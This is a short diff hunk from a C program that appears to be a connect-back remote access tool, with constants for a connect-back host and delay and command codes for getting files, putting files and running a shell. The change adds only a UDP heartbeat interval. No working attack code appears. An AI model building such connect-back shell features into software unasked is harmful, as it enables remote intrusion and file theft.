@@ -11,6 +11,10 @@ const char *server_hostname;
 #define CONNECT_BACK_HOST  "localhost"
 #define CONNECT_BACK_DELAY 5
 
+#ifndef MAX_UDP_HEARTBEAT
+#define MAX_UDP_HEARTBEAT (1 * 60)
+#endif
+
 #define GET_FILE 1
 #define PUT_FILE 2
 #define RUNSHELL 3
